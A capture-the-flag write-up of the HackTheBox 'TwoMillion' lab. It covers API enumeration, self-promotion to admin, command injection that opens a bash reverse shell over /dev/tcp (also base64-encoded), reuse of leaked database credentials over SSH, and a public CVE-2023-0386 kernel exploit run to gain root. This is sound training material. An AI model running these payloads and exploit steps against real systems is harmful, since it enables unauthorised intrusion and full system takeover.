---
title: TwoMillion
date: 2025-09-17
difficulty: Easy
os: Linux
summary: An old version of the HackTheBox platform that includes a hackable invite code. This box involves enumerating and using API endpoints, reverse shells, and credential hunting. The system kernel is found to be vulnerable to CVE-2023-0386.
tags:
  - Web
  - API
  - Privesc
  - CVE-2023-0386
slug: two-million
reviewed: "true"
---

# TwoMillion — HTB Write-Up

This write-up covers the full compromise of the **TwoMillion** HackTheBox lab.  
The path involves a combination of **web application analysis**, **API endpoint exploitation**, **command injection**, **credential reuse**, and a **kernel-level privilege escalation (CVE-2023-0386)**.

---

## Enumeration

We want to map out the attack space and prioritise which avenues we want to take.
### Quick TCP scan

A fast scan using `--open` shows us immediately which services are accessible so that we can get a rough idea of where we should be looking, and what we may need to do before taking more in-depth searches.

```bash
(wxlbr@htb)-[~]$ sudo nmap --open 10.129.241.225
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 06:17 CDT
Nmap scan report for 10.129.241.225
Host is up (0.0087s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

We can see that there are two open services - `ssh` and `http`. Given that `ssh` often requires credentials to access and we do not posses any at this stage, we know to focus are attention on the `http` service first.

![[Pasted image 20250917121808.png]]

---

### Service/Version scan

A follow-up Nmap scan with `-sC -sV` (lightweight NSE scripts and service detection) provides more information on exact versions and server banners that can help to identify potential misconfigurations or CVEs.

```bash
(wxlbr@htb)-[~]$ sudo nmap -sC -sV -Pn -p22,80 10.129.241.225
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 06:18 CDT
Nmap scan report for 10.129.241.225
Host is up (0.0077s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Now we know:
- `22/tcp` - **OpenSSH 8.2p1** (Ubuntu)
- `80/tcp` - **nginx 1.18.0** (Ubuntu)
	- Virtual host - `2million.htb`

No obvious exploits for these versions, therefore web enumeration is the logical next step.

![[Pasted image 20250917121907.png]]

---

### Add host to /etc/hosts

The site uses virtual hosts, therefore in order for us to access it we must resolve the hostname locally to the target IP. This can be done by editing our `/etc/hosts` file. This ensures we can browse to `http://2million.htb`.

```bash
(wxlbr@htb)-[~]$ echo "10.129.241.225 2million.htb" | sudo tee -a /etc/hosts
10.129.241.225 2million.htb
```

![[Pasted image 20250917122001.png]]

---

## Web Application Analysis

### Exploring the site

Browsing to `http://2million.htb` shows a retro HackTheBox-style web page.

![[Pasted image 20250917122816.png]]

Clicking _Join HTB_ redirects to an **invite code form** — strongly suggesting we’ll need to generate or retrieve a valid invite.

![[Pasted image 20250917122803.png]]

---

### Inspecting JavaScript

Looking into the page source and assets, we discover a file called `inviteapi.min.js`. The file name suggests that this file handles the API endpoints and could show us more about the client server interactions. However, the code is obfuscated so we cannot read it without deobfuscating it.

**Snippet**

```javascript
eval(
  function (p, a, c, k, e, d) {
    e = function (c) { return c.toString(36) };
    if (!''.replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] || c.toString(a)
      }
      k = [ function (e) { return d[e] } ];
      e = function () { return '\\w+' };
      c = 1
    };
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
      }
    }
    return p
  }(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
    0,{}
  )
)
```

Deobfuscation is a fairly simple process and can be done using tools such as [de4js](https://lelinhtinh.github.io/de4js/).

Result:

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) { console.log(response) },
        error: function (response) { console.log(response) }
    })
}
```

So we have two interesting endpoints:
- `/api/v1/invite/verify`
- `/api/v1/invite/how/to/generate`

Clearly, as we want to source an invite code, the `/api/v1/invite/how/to/generate` endpoint is one we want to follow further.

As a side note, client side code/logic is publicly visible so any sensitive logic should be handled on the server side.

---

### Query the invite generator endpoint

Calling `POST http://2million.htb/api/v1/invite/how/to/generate` given its path is likely to return an invite link, or potentially instructions on how to acquire one provided it is not protected behind authorisation. Lets try.

```bash
(wxlbr@htb)-[~]$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

The server returns a string that looks encoded, along with `enctype: ROT13`. This strongly suggests that it has given relevant information and all we need to do is decrypt it.

![[Pasted image 20250917123002.png]]

---

### Decode the response

ROT13 decoding the string reveals:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

![[Pasted image 20250917123203.png]]

So now we know we need to call `POST /invite/generate` to give us the code.

---

### Generate an invite code

Lets call `POST /invite/generate`

```bash
(wxlbr@htb)-[~]$ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"WThJTTItQlpPSlgtUVFQTFMtS0c2VDc=","format":"encoded"}}
```

The code is clearly Base64, so we will need to decode this.

![[Pasted image 20250917123123.png]]

---

### Decode the invite code

Lets decode the base64.

```bash
(wxlbr@htb)-[~]$ echo "WThJTTItQlpPSlgtUVFQTFMtS0c2VDc=" | base64 -d
Y8IM2-BZOJX-QQPLS-KG6T7
```

We can then return to the invite page we found earlier with our invite code, enter it and we see that it accepts the code.

![[Pasted image 20250917123357.png]]  
![[Pasted image 20250917123422.png]]

---

## Exploitation

### Registration and navigation

After registration, we land on the user homepage. Exploring reveals access to VPN downloads and additional API requests.

![[Pasted image 20250917123532.png]]  
![[Pasted image 20250917124251.png]]

The `regenerate` vpn button looks like it will likely call an api to generate new information from the server. We can intercept this traffic using burpsuite. 

We notice that all the API calls we have made so far use `/api/v1/`, if we call just `/api/v1/` we will likely find a response of all the endpoints available to us. Intercepting traffic shows a set of /api/v1/ endpoints, including admin ones.

![[Pasted image 20250917124434.png]]

---

### Escalating privileges via admin endpoints

Calling `/api/v1/admin/auth` confirms we are not currently an admin account, however, it does show that we have access to atleast some of the `/api/v1/admin` endpoints. So lets try some of the others.

![[Pasted image 20250917124623.png]]

Calling `/api/v1/admin/settings/update` accepts our requests but returns errors until properly formatted.

![[Pasted image 20250917124827.png]]

By trial and error, I discover it requires:
- Content-Type: `application/json`
- Parameters: `email` and `is_admin`
	- `is_admin` is a boolean value that only accepts `1` or `0`

When `is_admin` is set to `1`, my account is escalated successfully. This can be confirmed by calling `/api/v1/admin/auth`.

![[Pasted image 20250917125109.png]]

---

### Command injection through VPN generation

Now as admin, the endpoint `/api/v1/admin/vpn/generate` can be tried again and found to work unlike before.

Admin endpoints that generate system artefacts often run via shell commands on the server-side, therefore are often subject to command injection.

By injecting `;id;` in the `username` field, we can confirm code execution as `www-data`.

![[Pasted image 20250917125408.png]]

---

### Reverse shell

From here we can try to establish a reverse shell to the server.

I initially tried using payload `bash -i >& /dev/tcp/10.10.14.147/9443 0>&1;`, however this did not establish a reverse shell. This suggests that there is some filtering or formatting between sending the command and it being run on the server. This can often be avoided via base64 encoding so lets try that.

Lets encoded the reverse shell in Base64 to avoid bad character issues and send this payload.

```json
{
"username":"usernameTmp;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvOTQOMyAwPiYx I base64 -d I bash;"
}
```

Set up a listener on our machine using netcat. Have the listener running before sending the payload in order to catch it.

```bash
(wxlbr@htb)-[~]$ nc -lvnp 9443
```

After encoding and executing, we catch a shell. We can confirm by running the `id` command and we are met with the same `www-data` user. Now are aim is to escalate our privileges as we are a low level user at the moment.

![[Pasted image 20250917125716.png]]

---

## Post-Exploitation

### Credential discovery

First we can check the saved environment variables, and we can see there is a database running on the server with the following credentials.

```
DB_USER=admin
DB_PASS=SuperDuperPass123
```

![[Pasted image 20250917130058.png]]

As credentials are often reused we can test them over SSH. We find that this works and logs us in as `admin`.

```bash
(wxlbr@htb)-[~]$ ssh admin@10.129.241.225
# password: SuperDuperPass123
```

Once logged in we can run `id` to check we have successfully signed in as `admin`.

```bash
(admin@2million)-[~]$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

![[Pasted image 20250917130241.png]]

The user flag can then be found located in `/home/admin/user.txt`.

---

### Kernel Privilege Escalation (CVE-2023-0386)

Now we have admin user credentials, we can take a look around for anything useful. In  `/var/mail`  we find a file named admin. On taking a closer look we discover it is an email sent to our admin user. 

The email reads:

```text
Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

This email hints at OverlayFS/FUSE vulnerabilities. Researching this we can find that **CVE-2023-0386** could be a good fit.

![[Pasted image 20250917130349.png]]
#### Exploitation

We can find a Proof of Concept exploit for **CVE-2023-0386** at [https://github.com/puckiestyle/CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386).

We can download the exploit to our machine via git

```bash
(wxlbr@htb)-[~]$ git clone https://github.com/puckiestyle/CVE-2023-0386
```

![[Pasted image 20250917135944.png]]

Then we can transfer it over to our target machine via the ssh session using SCP. Be sure to check everything moves over correctly. 

```bash
(wxlbr@htb)-[~]$ scp -r ./CVE-2023-0386/ admin@10.129.241.225:/tmp/
```

![[Pasted image 20250917135900.png]]

Now use `make all` to build the exploit on the target, some warnings may appear however those can be ignored for now

```bash
(admin@2million)-[~]$ make all
```

![[Pasted image 20250917140005.png]]

Now open two terminals connected to the server, in one run the following and leave it running in the background.

```bash
(admin@2million)-[~]$ ./fuse ./ovlcap/lower ./gc   # run in background
```

![[Pasted image 20250917140051.png]]

Then open the other terminal on the server and run the following. This should give some output, look out for the `exploit success!` line to show that it has worked. Then you will notice we are returned to the terminal but we are now the root user.

```bash
(admin@2million)-[~]$ ./exp                        # run in second terminal
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 sep 17 13:01 .
drwxr-xr-x 6 root   root     4096 sep 17 13:05 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a comand as administrator (user "root"), use "sudo <command>".
See "man sudo root" for details.
```

![[Pasted image 20250917140659.png]]

We can then navigate to `/root/` to find the root flag.

**Congratulations, you have completed lab `TwoMillion`!**